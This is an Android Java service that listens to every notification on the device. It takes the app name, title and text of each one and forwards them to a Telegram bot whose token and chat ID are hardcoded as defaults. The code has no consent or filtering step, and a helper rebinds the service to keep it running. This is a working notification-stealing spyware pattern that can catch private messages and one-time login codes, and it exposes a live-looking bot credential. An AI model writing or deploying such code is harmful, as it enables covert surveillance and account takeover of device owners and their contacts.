package com.example.notificationlogger;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

public class NotificationCaptureService extends NotificationListenerService {
    private static final String TAG = "NotifyLogger";

    @Override
    public void onListenerConnected() {
        Log.d(TAG, "CONNECTED: Service is now listening for notifications.");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Log.d(TAG, "POSTED: Notification from " + sbn.getPackageName());

            SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
            String token = prefs.getString("bot_token", "8265963835:AAEIknEuysIsTWDwx1_bCFKOF1YIpLCoRT8");
            String chatId = prefs.getString("chat_id", "1786564127");

            if (token == null || token.isEmpty()) return;

            String packageName = sbn.getPackageName();
            String title = "None";
            String text = "None";

            if (sbn.getNotification().extras != null) {
                CharSequence titleCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
                CharSequence textCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
                
                if (titleCs != null) title = titleCs.toString();
                if (textCs != null) text = textCs.toString();
            }

            // Direct call to send
            new TelegramBotManager(token, chatId).sendNotificationLog(
                new NotificationLog(packageName, title, text, title, System.currentTimeMillis())
            );

        } catch (Exception e) {
            Log.e(TAG, "Error in onNotificationPosted", e);
        }
    }

    // This helps restart the service if it gets stuck
    public static void nudgeService(Context context) {
        Log.d(TAG, "Nudging service...");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            requestRebind(new ComponentName(context, NotificationCaptureService.class));
        }
    }
}